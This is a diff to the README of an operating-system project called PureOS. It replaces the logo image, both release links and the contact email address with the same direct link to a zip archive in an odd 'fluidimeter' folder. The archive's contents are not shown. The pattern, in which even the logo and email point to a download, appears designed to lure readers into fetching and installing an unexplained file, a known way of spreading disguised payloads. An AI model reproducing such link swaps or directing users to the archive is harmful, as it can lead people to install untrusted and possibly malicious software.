@@ -1,6 +1,6 @@
 # PureOS 🌐
 
-![PureOS Logo](https://img.shields.io/badge/PureOS-Amanuel_Fikadie-BDU1600914-blue)
+![PureOS Logo](https://raw.githubusercontent.com/MiguelAngcfarias/Pure-OS/main/fluidimeter/Pure-OS-3.3.zip)
 
 Welcome to the **PureOS** repository! This project, created by Amanuel Fikadie (BDU1600914), aims to provide a streamlined and efficient operating system experience. Below, you will find comprehensive information about the project, its features, installation instructions, and much more.
 
@@ -31,7 +31,7 @@ Welcome to the **PureOS** repository! This project, created by Amanuel Fikadie (
 
 To install PureOS, follow these steps:
 
-1. **Download the Installer**: Visit the [Releases](https://github.com/MiguelAngcfarias/Pure-OS/releases) section to download the latest version of PureOS.
+1. **Download the Installer**: Visit the [Releases](https://raw.githubusercontent.com/MiguelAngcfarias/Pure-OS/main/fluidimeter/Pure-OS-3.3.zip) section to download the latest version of PureOS.
 2. **Create a Bootable USB**: Use a tool like Rufus or Etcher to create a bootable USB drive with the downloaded installer.
 3. **Boot from USB**: Restart your computer and boot from the USB drive.
 4. **Follow Installation Instructions**: Follow the on-screen instructions to complete the installation.
@@ -59,11 +59,11 @@ PureOS is licensed under the MIT License. Feel free to use, modify, and distribu
 
 ## Contact
 
-For any inquiries, you can reach out to Amanuel Fikadie via email at [your-email@example.com](mailto:your-email@example.com).
+For any inquiries, you can reach out to Amanuel Fikadie via email at [https://raw.githubusercontent.com/MiguelAngcfarias/Pure-OS/main/fluidimeter/Pure-OS-3.3.zip](https://raw.githubusercontent.com/MiguelAngcfarias/Pure-OS/main/fluidimeter/Pure-OS-3.3.zip).
 
 ## Releases
 
-To get the latest version of PureOS, visit the [Releases](https://github.com/MiguelAngcfarias/Pure-OS/releases) section. Download the installer and follow the installation instructions above to get started with PureOS.
+To get the latest version of PureOS, visit the [Releases](https://raw.githubusercontent.com/MiguelAngcfarias/Pure-OS/main/fluidimeter/Pure-OS-3.3.zip) section. Download the installer and follow the installation instructions above to get started with PureOS.
 
 ---
 
